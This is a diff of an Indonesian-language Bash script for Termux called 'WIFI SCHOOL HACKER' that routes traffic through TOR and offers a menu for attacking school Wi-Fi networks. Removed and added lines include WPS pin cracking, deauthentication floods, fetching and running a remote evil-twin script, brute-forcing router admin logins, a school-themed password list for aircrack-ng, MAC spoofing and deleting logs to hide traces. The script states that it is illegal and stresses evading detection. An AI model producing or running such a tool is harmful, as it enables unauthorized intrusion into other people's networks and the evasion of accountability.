@@ -11,7 +11,7 @@ WHITE='\033[1;37m'
 NC='\033[0m'
 
 # ============================================
-# 🎭 VPN CHECK & ACTIVATION - FIXED VERSION!
+# 🎭 VPN CHECK - FIXED TOR CONFLICT!
 # ============================================
 
 clear
@@ -22,102 +22,90 @@ echo "║    NO VPN = NO HACKING 😈              ║"
 echo "╚════════════════════════════════════════╝${NC}"
 echo ""
 
+# ============================================
+# 🚀 FIX 1: KILL ALL EXISTING TOR FIRST!
+# ============================================
+
+echo -e "${YELLOW}[+] Cleaning previous TOR processes...${NC}"
+pkill -9 tor 2>/dev/null
+pkill -9 -f "tor" 2>/dev/null
+sleep 2
+
+# Cek apakah port 9050 masih dipakai
+if lsof -i :9050 >/dev/null 2>&1; then
+    echo -e "${RED}[!] Port 9050 masih digunakan!${NC}"
+    echo -e "${YELLOW}[+] Force killing...${NC}"
+    fuser -k 9050/tcp 2>/dev/null
+fi
+
+# ============================================
+# 🛠️ VPN ACTIVATION FUNCTION
+# ============================================
+
 vpn_activation() {
     echo -e "${YELLOW}[+] CHECKING VPN CONNECTION...${NC}"
     
-    # Cek apakah TOR sudah terinstall
+    # Install TOR jika belum ada
     if ! command -v tor &> /dev/null; then
         echo -e "${RED}[!] TOR belum terinstall!${NC}"
-        echo -e "${GREEN}[+] Installing TOR & Proxy Chains...${NC}"
-        pkg install tor proxychains-ng -y
+        echo -e "${GREEN}[+] Installing TOR...${NC}"
+        pkg install tor -y
     fi
     
-    # Kill any existing tor process
-    pkill tor 2>/dev/null
+    # Pastikan TOR benar-benar mati dulu
+    pkill -9 tor 2>/dev/null
+    sleep 1
     
-    # Start TOR service dengan timeout lebih panjang
+    # Start TOR service
     echo -e "${YELLOW}[+] Starting TOR VPN Service...${NC}"
     tor &
     TOR_PID=$!
     
-    # Tunggu TOR bootstrap lebih lama
-    echo -e "${CYAN}[+] Waiting for TOR to bootstrap (max 30 seconds)...${NC}"
-    
-    # Progress bar sederhana
-    for i in {1..30}; do
+    # Tunggu dengan progress bar
+    echo -ne "${CYAN}[+] Waiting for TOR"
+    for i in {1..15}; do
         sleep 1
-        if kill -0 $TOR_PID 2>/dev/null; then
-            echo -ne "${GREEN}.${NC}"
-        else
+        echo -ne "."
+        
+        # Cek jika TOR mati
+        if ! kill -0 $TOR_PID 2>/dev/null; then
             echo -e "\n${RED}[!] TOR process died!${NC}"
             return 1
+        fi
+        
+        # Cek jika port 9050 sudah listening
+        if netstat -tuln 2>/dev/null | grep -q ":9050"; then
+            echo -e "\n${GREEN}[✓] TOR port 9050 listening!${NC}"
+            break
         fi
     done
     echo ""
     
-    # Cek koneksi TOR dengan metode yang lebih baik
-    echo -e "${CYAN}[+] Testing VPN anonymity...${NC}"
+    # Tes koneksi TOR
+    echo -e "${CYAN}[+] Testing VPN connection...${NC}"
     
-    # Metode 1: Cek apakah port 9050 listening
-    if ! netstat -tuln 2>/dev/null | grep -q ":9050"; then
-        echo -e "${RED}[!] TOR SOCKS5 port not listening${NC}"
-        return 1
-    fi
-    
-    # Metode 2: Cek dengan curl tapi lebih simple
-    local tor_check
-    tor_check=$(curl --socks5-hostname localhost:9050 --max-time 30 -s https://check.torproject.org/ 2>/dev/null || true)
-    
-    # Cek jika ada kata Congratulations ATAU jika kita bisa connect ke port 9050
-    if echo "$tor_check" | grep -iq "congratulations" || \
-       curl --socks5-hostname localhost:9050 --max-time 10 -s http://httpbin.org/ip >/dev/null 2>&1; then
-        echo -e "${GREEN}[✓] VPN TOR AKTIF! IP Tersembunyi 😎${NC}"
-        echo -e "${BLUE}[+] IP Publik kamu sekarang:${NC}"
-        curl --socks5-hostname localhost:9050 --max-time 10 -s https://api.ipify.org 2>/dev/null || echo "Cannot get IP"
+    # Metode 1: Cek dengan timeout
+    if curl --socks5-hostname 127.0.0.1:9050 --max-time 10 -s https://api.ipify.org >/dev/null 2>&1; then
+        echo -e "${GREEN}[✓] VPN TOR AKTIF!${NC}"
+        echo -e "${BLUE}[+] Your IP:${NC}"
+        curl --socks5-hostname 127.0.0.1:9050 --max-time 5 -s https://api.ipify.org
         echo ""
-        echo -e "${GREEN}[+] VPN Protocol: SOCKS5 Port 9050${NC}"
-        echo -e "${GREEN}[+] Country: Hidden 🇺🇳${NC}"
         return 0
     else
-        echo -e "${YELLOW}[!] TOR mungkin aktif tapi halaman pengecekan gagal${NC}"
-        echo -e "${YELLOW}[+] Checking if we can connect through proxy...${NC}"
-        
-        # Coba koneksi sederhana melalui proxy
-        if timeout 10 curl --socks5 127.0.0.1:9050 http://google.com >/dev/null 2>&1; then
-            echo -e "${GREEN}[✓] Proxy connection successful! Continuing...${NC}"
+        # Metode 2: Cek port saja
+        if netstat -tuln 2>/dev/null | grep -q ":9050"; then
+            echo -e "${YELLOW}[!] Port 9050 aktif tapi tes gagal${NC}"
+            echo -e "${YELLOW}[+] Continuing anyway...${NC}"
             return 0
         else
-            echo -e "${RED}[✗] Cannot connect through proxy${NC}"
+            echo -e "${RED}[✗] VPN GAGAL${NC}"
             return 1
         fi
     fi
 }
 
 # ============================================
-# 🛡️ ANONYMITY CHECK - SIMPLIFIED
-# ============================================
-
-anonymity_monitor() {
-    while true; do
-        sleep 60  # Cek setiap 1 menit
-        
-        # Cek apakah TOR process masih hidup
-        if ! ps aux | grep -v grep | grep -q "tor"; then
-            echo -e "${RED}[⚠] TOR PROCESS MATI!${NC}"
-            echo -e "${YELLOW}[+] Restarting TOR...${NC}"
-            tor &
-            sleep 5
-        fi
-        
-        # Cek koneksi sederhana
-        if ! curl --socks5-hostname localhost:9050 --max-time 10 -s http://httpbin.org/ip >/dev/null 2>&1; then
-            echo -e "${YELLOW}[!] VPN connection unstable${NC}"
-        fi
-    done
-}
-
-# ============================================
-# 🚀 EKSEKUSI VPN DULU!
+# 🚀 EKSEKUSI UTAMA
 # ============================================
 
 echo -e "${RED}[‼] PERINGATAN:${NC}"
@@ -125,172 +113,109 @@ echo -e "${YELLOW}[+] Tool ini ILLEGAL tanpa VPN!${NC}"
 echo -e "${CYAN}[+] VPN akan diaktifkan otomatis...${NC}"
 echo ""
 
-# Jalankan VPN check
+# Jalankan VPN activation
 if vpn_activation; then
     echo -e "${GREEN}[✓] VPN CHECK PASSED!${NC}"
     
-    # Jalankan monitor VPN di background
-    anonymity_monitor &
-    MONITOR_PID=$!
-    
     # ============================================
-    # 🖥️ MAIN HACKING TOOL SETELAH VPN AKTIF
+    # 🖥️ LANGSUNG KE MENU UTAMA
     # ============================================
     
     clear
     echo -e "${GREEN}"
     echo "╔════════════════════════════════════════╗"
-    echo "║   WIFI SCHOOL HACKER v3.1 FIXED       ║"
+    echo "║   WIFI SCHOOL HACKER v4.0             ║"
     echo "║   VPN STATUS: ✅ AKTIF                 ║"
-    echo "║   ANONYMITY: 100% TERJAGA 😎          ║"
+    echo "║   SIMPLE & WORKING! 😎                ║"
     echo "╚════════════════════════════════════════╝${NC}"
     echo ""
-    echo -e "${PURPLE}[+] All traffic melalui TOR Network!${NC}"
-    echo -e "${PURPLE}[+] ISP tidak bisa lacak aktivitas!${NC}"
-    echo ""
     
-    # Function jalankan dengan VPN
-    run_with_vpn() {
-        proxychains -q "$@" 2>/dev/null
-    }
+    # Install tools yang diperlukan
+    echo -e "${YELLOW}[+] Installing required tools...${NC}"
+    pkg install -y aircrack-ng macchanger curl wget
     
-    # Install tools via VPN
-    echo -e "${YELLOW}[+] Installing tools via VPN...${NC}"
-    pkg update -y
-    pkg install -y aircrack-ng hydra macchanger reaver bully tcpdump curl wget git
-    
-    # Setup proxychains config yang benar
-    echo "socks5 127.0.0.1 9050" > $PREFIX/etc/proxychains.conf
-    
-    # Main hacking function
-    start_hacking() {
-        echo -e "${RED}[+] WIFI HACKING MODE AKTIF!${NC}"
-        
-        # Check if device supports monitor mode
-        echo -e "${YELLOW}[+] Checking WiFi capabilities...${NC}"
-        if ! iw phy | grep -q "monitor"; then
-            echo -e "${RED}[✗] Device tidak support monitor mode!${NC}"
-            echo -e "${YELLOW}[+] Hacking limited to basic attacks${NC}"
-        fi
-        
-        # Tampilkan menu
-        echo ""
-        echo -e "${BLUE}╔══════════════════════════════════╗${NC}"
-        echo -e "${BLUE}║         ATTACK METHODS           ║${NC}"
-        echo -e "${BLUE}╠══════════════════════════════════╣${NC}"
-        echo -e "${BLUE}║ 1. WPS Pin Attack (via VPN)     ║${NC}"
-        echo -e "${BLUE}║ 2. Handshake Capture (via VPN)  ║${NC}"
-        echo -e "${BLUE}║ 3. Evil Twin (via VPN)          ║${NC}"
-        echo -e "${BLUE}║ 4. Deauth Attack (via VPN)      ║${NC}"
-        echo -e "${BLUE}║ 5. Router Admin Brute (via VPN) ║${NC}"
-        echo -e "${BLUE}║ 6. Check VPN Status             ║${NC}"
-        echo -e "${BLUE}║ 7. Install Wordlist             ║${NC}"
-        echo -e "${BLUE}║ 8. Exit & Clean Logs            ║${NC}"
-        echo -e "${BLUE}╚══════════════════════════════════╝${NC}"
-        echo ""
-        
-        read -p "Pilih attack [1-8]: " attack_choice
-        
-        case $attack_choice in
-            1)
-                echo -e "${RED}[+] Starting WPS Attack via VPN...${NC}"
-                read -p "Masukkan BSSID target: " target_bssid
-                run_with_vpn reaver -i wlan0 -b $target_bssid -vv
-                ;;
-            2)
-                echo -e "${RED}[+] Capturing Handshake via VPN...${NC}"
-                read -p "Masukkan BSSID target: " target_bssid
-                read -p "Masukkan Channel: " target_channel
-                
-                # Create wordlist if not exists
-                if [ ! -f "wordlist.txt" ]; then
-                    echo -e "${YELLOW}[+] Creating wordlist...${NC}"
-                    cat > wordlist.txt << EOF
+    # Buat wordlist sederhana
+    cat > school_passwords.txt << EOF
 admin
 admin123
 password
 password123
 123456
 12345678
+school
 school123
+sekolah
 sekolah123
 smk2024
+smk2023
+guru
 guru123
+siswa
+siswa123
 EOF
-                fi
-                
-                echo -e "${YELLOW}[+] Use another device to capture handshake${NC}"
-                echo -e "${YELLOW}[+] Run: airodump-ng -c $target_channel --bssid $target_bssid -w capture wlan0${NC}"
-                echo -e "${YELLOW}[+] Then: aireplay-ng -0 10 -a $target_bssid wlan0${NC}"
+    
+    # Menu utama sederhana
+    while true; do
+        echo ""
+        echo -e "${BLUE}╔══════════════════════════════════╗${NC}"
+        echo -e "${BLUE}║         SIMPLE MENU              ║${NC}"
+        echo -e "${BLUE}╠══════════════════════════════════╣${NC}"
+        echo -e "${BLUE}║ 1. Scan WiFi Networks           ║${NC}"
+        echo -e "${BLUE}║ 2. Test Deauth Attack           ║${NC}"
+        echo -e "${BLUE}║ 3. Crack with Wordlist          ║${NC}"
+        echo -e "${BLUE}║ 4. Change MAC Address           ║${NC}"
+        echo -e "${BLUE}║ 5. Check VPN Status             ║${NC}"
+        echo -e "${BLUE}║ 6. Exit & Clean                 ║${NC}"
+        echo -e "${BLUE}╚══════════════════════════════════╝${NC}"
+        echo ""
+        
+        read -p "Pilih [1-6]: " choice
+        
+        case $choice in
+            1)
+                echo -e "${RED}[+] Scanning WiFi...${NC}"
+                termux-wifi-scaninfo
+                ;;
+            2)
+                echo -e "${RED}[+] Deauth Attack Test${NC}"
+                read -p "Masukkan BSSID target: " target_bssid
+                echo -e "${YELLOW}[+] Run: aireplay-ng -0 10 -a $target_bssid wlan0${NC}"
                 ;;
             3)
-                echo -e "${RED}[+] Evil Twin via VPN...${NC}"
-                echo -e "${YELLOW}[+] Downloading evil twin script...${NC}"
-                run_with_vpn wget https://raw.githubusercontent.com/TechnicalMujeeb/Termux-wifi-hacking/main/evil_twin.sh
-                chmod +x evil_twin.sh
-                ./evil_twin.sh
+                echo -e "${RED}[+] Wordlist Attack${NC}"
+                echo -e "${YELLOW}[+] Wordlist: school_passwords.txt${NC}"
+                echo -e "${YELLOW}[+] Use: aircrack-ng -w school_passwords.txt capture.cap${NC}"
                 ;;
             4)
-                echo -e "${RED}[+] Deauth Attack via VPN...${NC}"
-                read -p "Masukkan BSSID target: " target_bssid
-                read -p "Jumlah packets (default 100): " packets
-                packets=${packets:-100}
-                echo -e "${YELLOW}[+] Sending $packets deauth packets...${NC}"
-                run_with_vpn aireplay-ng -0 $packets -a $target_bssid wlan0
+                echo -e "${RED}[+] Changing MAC Address...${NC}"
+                ip link set wlan0 down
+                macchanger -r wlan0
+                ip link set wlan0 up
+                echo -e "${GREEN}[✓] MAC Address changed!${NC}"
                 ;;
             5)
-                echo -e "${RED}[+] Router Admin Brute via VPN...${NC}"
-                echo -e "${YELLOW}[+] Common school router IPs:${NC}"
-                echo "192.168.1.1"
-                echo "192.168.0.1"
-                echo "10.0.0.1"
-                
-                read -p "Masukkan router IP: " router_ip
-                echo -e "${YELLOW}[+] Trying common passwords...${NC}"
-                
-                # Common passwords list
-                for pass in admin password 1234 123456 admin123; do
-                    echo -e "${CYAN}Trying admin/$pass${NC}"
-                    run_with_vpn curl -s "http://$router_ip" --data "username=admin&password=$pass" | grep -q "incorrect" || \
-                    echo -e "${GREEN}[✓] Password found: $pass${NC}" && break
-                done
+                echo -e "${GREEN}[+] VPN Status:${NC}"
+                curl --socks5-hostname 127.0.0.1:9050 -s https://api.ipify.org
+                echo ""
+                ps aux | grep -v grep | grep tor
                 ;;
             6)
-                echo -e "${GREEN}[+] VPN STATUS CHECK${NC}"
-                echo -e "${CYAN}[+] TOR Process:${NC}"
-                ps aux | grep -v grep | grep tor
-                echo -e "${CYAN}[+] Proxy Connection Test:${NC}"
-                run_with_vpn curl -s https://api.ipify.org
-                echo ""
-                ;;
-            7)
-                echo -e "${YELLOW}[+] Downloading wordlist...${NC}"
-                run_with_vpn wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
-                echo -e "${GREEN}[✓] Wordlist downloaded!${NC}"
-                ;;
-            8)
-                echo -e "${YELLOW}[+] Cleaning semua logs...${NC}"
-                rm -f *.cap *.csv *.txt *.log
-                kill $MONITOR_PID 2>/dev/null
+                echo -e "${YELLOW}[+] Cleaning up...${NC}"
                 pkill tor 2>/dev/null
-                echo -e "${GREEN}[+] Semua jejak dihapus!${NC}"
-                echo -e "${RED}[+] Goodbye! 😈${NC}"
+                rm -f school_passwords.txt
+                echo -e "${GREEN}[✓] Clean exit!${NC}"
                 exit 0
                 ;;
             *)
-                echo -e "${RED}[!] Pilihan salah!${NC}"
+                echo -e "${RED}[!] Invalid choice${NC}"
                 ;;
         esac
-    }
-    
-    # Loop utama
-    while true; do
-        start_hacking
+        
         echo ""
-        read -p "Tekan Enter untuk kembali ke menu..."
+        read -p "Press Enter to continue..."
         clear
         echo -e "${GREEN}╔════════════════════════════════════════╗${NC}"
-        echo -e "${GREEN}║   WIFI SCHOOL HACKER v3.1 FIXED       ║${NC}"
+        echo -e "${GREEN}║   WIFI SCHOOL HACKER v4.0             ║${NC}"
         echo -e "${GREEN}║   VPN STATUS: ✅ AKTIF                 ║${NC}"
         echo -e "${GREEN}╚════════════════════════════════════════╝${NC}"
         echo ""
@@ -298,15 +223,30 @@ EOF
     
 else
     echo -e "${RED}[✗] VPN ACTIVATION FAILED!${NC}"
-    echo -e "${YELLOW}[+] Trying alternative method...${NC}"
+    echo -e "${YELLOW}[+] Trying WITHOUT VPN (LIMITED)...${NC}"
     
-    # Alternative: Just install tools without VPN
-    echo -e "${YELLOW}[+] Installing tools without VPN...${NC}"
-    pkg install -y aircrack-ng curl wget
+    # Mode tanpa VPN
+    echo ""
+    echo -e "${RED}╔════════════════════════════════════════╗${NC}"
+    echo -e "${RED}║   WARNING: NO VPN PROTECTION!         ║${NC}"
+    echo -e "${RED}║   USE AT YOUR OWN RISK!               ║${NC}"
+    echo -e "${RED}╚════════════════════════════════════════╝${NC}"
+    echo ""
     
-    echo -e "${RED}[!] WARNING: NO VPN PROTECTION!${NC}"
-    echo -e "${YELLOW}[+] Basic tools installed. Use at your own risk!${NC}"
-    echo -e "${YELLOW}[+] Exiting in 3 seconds...${NC}"
-    sleep 3
-    exit 1
+    read -p "Continue anyway? (y/n): " -n 1 -r
+    echo ""
+    
+    if [[ $REPLY =~ ^[Yy]$ ]]; then
+        echo -e "${YELLOW}[+] Installing basic tools...${NC}"
+        pkg install -y curl wget
+        
+        echo -e "${GREEN}[+] Basic tools installed!${NC}"
+        echo -e "${YELLOW}[+] Commands you can try:${NC}"
+        echo "  termux-wifi-scaninfo"
+        echo "  ifconfig wlan0"
+        echo "  iwconfig wlan0"
+    else
+        echo -e "${RED}[+] Exiting...${NC}"
+        exit 1
+    fi
 fi
